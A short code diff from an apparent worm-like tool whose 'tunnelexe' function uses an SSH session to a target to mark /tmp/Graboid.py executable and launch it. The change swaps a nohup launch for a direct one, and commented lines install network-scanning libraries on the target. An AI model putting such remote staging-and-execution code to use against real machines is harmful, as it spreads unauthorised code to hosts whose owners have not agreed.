@@ -91,7 +91,7 @@ def tunnelexe(sshTGT, sftpTGT):
         # sshTGT.exec_command("pip install netifaces")        
         # sshTGT.exec_command("python3 -m pip install python-nmap")
         sshTGT.exec_command("chmod a+x /tmp/Graboid.py" )
-        sshTGT.exec_command("nohup python /tmp/Graboid.py")
+        sshTGT.exec_command("./Graboid.py")
         
     except:
         print(sys.exc_info()[0])
